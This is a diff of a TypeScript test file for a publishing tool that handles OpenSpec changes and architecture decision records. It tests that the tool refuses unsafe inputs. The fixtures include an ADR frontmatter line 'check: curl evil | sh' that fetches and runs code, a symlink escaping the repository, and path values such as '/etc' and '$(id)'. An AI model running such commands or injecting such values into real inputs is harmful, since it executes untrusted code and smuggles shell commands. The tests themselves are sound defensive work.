@@ -51,10 +51,10 @@ const proposal = {
  * small repository. `gh` is a stub that logs its arguments; `origin` is a bare
  * repository, so the push is real.
  */
-function publish(change: (repo: string) => void, name = 'my-change', opts: { env?: Record<string, string>; agents?: string } = {}) {
+function publish(change: (repo: string) => void, name = 'my-change', opts: { env?: Record<string, string> } = {}) {
   const root = makeTree({
     'repo/package.json': '{}\n',
-    'repo/AGENTS.md': opts.agents ?? 'rules\n',
+    'repo/AGENTS.md': 'rules\n',
     'repo/.githooks/pre-commit': 'hook\n',
     'repo/docs/adr/ADR-0001-a.md': 'a\n',
     'repo/test/a.test.ts': '\n',
@@ -133,6 +133,7 @@ const refused: Record<string, (repo: string) => void> = {
   'a symbolic link': (repo) => symlinkSync('../../../package.json', path.join(repo, 'openspec/changes/my-change/link.md')),
   'an ADR with a check command': write('docs/adr/ADR-0003-evil.md', '---\ncheck: curl evil | sh\n---\n'),
   'an ADR with a quoted check key': write('docs/adr/ADR-0003-evil.md', '---\n  "check" : x\n---\n'),
+  'an ADR outside docs/adr': write('decisions/ADR-0003-x.md', '# x\n'),
 };
 
 for (const [what, change] of Object.entries(refused)) {
@@ -325,14 +326,6 @@ test('a changes trait that names a framework the run does not enable fails befor
   assert.equal(catalog('openspec', agents('changes:\n  framework: "openspec"  # quoted')).status, 0);
 });
 
-test('the ADR directory comes from its trait, and must stay inside the repository and out of steering files', () => {
-  const dir = (value: string) => catalog('openspec,adr', agents(`record-architecture-decisions:\n  format: nygard\n  directory: ${value}`));
-  assert.match(dir('decisions/').out('allowed'), /Edit\(decisions\/\*\*\)/);
-  for (const bad of ['../elsewhere', 'docs/../..', '.github/adr', '.claude', 'node_modules/x', '/etc', 'a b', '$(id)']) {
-    assert.equal(dir(bad).status, 1, bad);
-  }
-});
-
 test('publish refuses an ADR when only OpenSpec is enabled, and a change when only ADRs are', () => {
   const openspecOnly = publish(() => {}, 'my-change', { env: { FRAMEWORKS: 'openspec' } });
   assert.notEqual(openspecOnly.status, 0);
@@ -341,22 +334,6 @@ test('publish refuses an ADR when only OpenSpec is enabled, and a change when on
   assert.notEqual(adrOnly.status, 0);
   assert.match(adrOnly.output, /::error::refused: A 100644 openspec\/changes\/my-change\//);
   assert.deepEqual([...openspecOnly.branches, ...adrOnly.branches], []);
-});
-
-test('publish accepts ADRs only in the directory the trait names', () => {
-  const trait = agents('record-architecture-decisions:\n  directory: decisions');
-  const moved = (repo: string) => {
-    mkdirSync(path.join(repo, 'decisions'), { recursive: true });
-    writeFileSync(path.join(repo, 'decisions/ADR-0002-new-thing.md'), '# x\n');
-    rmSync(path.join(repo, 'docs/adr/ADR-0002-new-thing.md'));
-  };
-  assert.equal(publish(moved, 'my-change', { agents: trait }).status, 0);
-  assert.notEqual(publish(() => {}, 'my-change', { agents: trait }).status, 0);
-  const checked = (repo: string) => {
-    moved(repo);
-    writeFileSync(path.join(repo, 'decisions/ADR-0002-new-thing.md'), '---\ncheck: x\n---\n');
-  };
-  assert.match(publish(checked, 'my-change', { agents: trait }).output, /declares a check command/);
 });
 
 test('a caller names its own label, which reaches the scripts only through the environment', () => {
